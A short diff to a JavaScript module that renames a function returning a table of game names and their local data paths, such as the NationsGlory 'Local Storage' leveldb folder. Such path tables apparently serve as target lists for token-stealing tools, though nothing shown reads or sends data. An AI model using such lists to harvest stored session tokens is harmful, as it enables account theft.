@@ -1,4 +1,4 @@
-const getGames = () => {
+const GetGames = () => {
     return {
         'NationsGlory': {
             'Local Storage': 'AppData\\Roaming\\NationsGlory\\Local Storage\\leveldb',
@@ -35,5 +35,5 @@ const getGames = () => {
 };
 
 module.exports = {
-    getGames
-}
+    GetGames
+};
